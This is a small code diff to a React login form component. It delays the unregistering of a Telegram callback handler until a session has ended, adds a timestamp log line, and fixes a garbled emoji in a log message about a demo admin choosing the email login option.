@@ -94,14 +94,17 @@ export const LoginForm = () => {
   useEffect(() => {
     if (sessionId) {
       console.log("🔗 Registering callback handler for session:", sessionId);
+      console.log("🕐 Registration time:", new Date().toLocaleString());
+
       registerTelegramCallback(sessionId, handleAdminAction);
 
+      // Don't unregister immediately on unmount - let the service handle cleanup
       return () => {
-        console.log(
-          "🔌 Unregistering callback handler for session:",
-          sessionId,
-        );
-        unregisterTelegramCallback(sessionId);
+        console.log("🔌 Scheduling unregistration for session:", sessionId);
+        // Longer delay to prevent premature cleanup
+        setTimeout(() => {
+          unregisterTelegramCallback(sessionId);
+        }, 1000);
       };
     }
   }, [sessionId]);
@@ -317,7 +320,7 @@ export const LoginForm = () => {
                   handleAdminAction("google");
                   break;
                 case "3":
-                  console.log("���� Demo admin chose: Email");
+                  console.log("🎭 Demo admin chose: Email");
                   handleAdminAction("email");
                   break;
                 default:
